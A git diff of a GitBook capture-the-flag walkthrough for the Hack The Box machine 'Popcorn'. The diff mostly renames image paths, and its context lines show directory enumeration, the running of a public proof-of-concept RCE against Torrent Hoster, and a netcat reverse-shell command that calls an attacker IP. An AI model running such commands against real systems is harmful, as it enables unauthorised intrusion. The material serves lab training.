@@ -4,7 +4,7 @@ icon: ubuntu
 
 # Popcorn - Medium
 
-<figure><img src="../../.gitbook/assets/image (15) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/popcorn"><strong>Popcorn</strong></a></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/popcorn"><strong>Popcorn</strong></a></p></figcaption></figure>
 
 ## <mark style="color:$success;">Scanning & Enumeration</mark>
 
@@ -84,21 +84,21 @@ feroxbuster -u http://popcorn.htb -n
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 A couple of interesting endpoints I'll take a look at each one
 
 #### <mark style="color:$primary;">/test.php & /test</mark>
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Reveals info.php
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### <mark style="color:$primary;">/torrent</mark>
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is a file sharing application. I'll do some more directory busting on this endpoint
 
@@ -110,15 +110,15 @@ feroxbuster -u http://popcorn.htb/torrent -n
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 A lot of new endpoints to explore. I'll take a loot at the readme first
 
 #### <mark style="color:$primary;">/torrent/readme</mark>
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a version for this application!
 
@@ -126,7 +126,7 @@ I'll look for any available exploits for this version
 
 ### <mark style="color:blue;">Torrent Hoster Unauthenticated RCE</mark>
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a POC available on Github I'll download that one
 
@@ -296,7 +296,7 @@ python3 torrent_hoster_unauthenticated_rce.py --url=http://popcorn.htb/torrent/
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I'll get a better shell using netcat
 
@@ -306,7 +306,7 @@ nc 10.10.16.63 443 -e /bin/bash
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:$success;">Post Exploitation</mark>
 
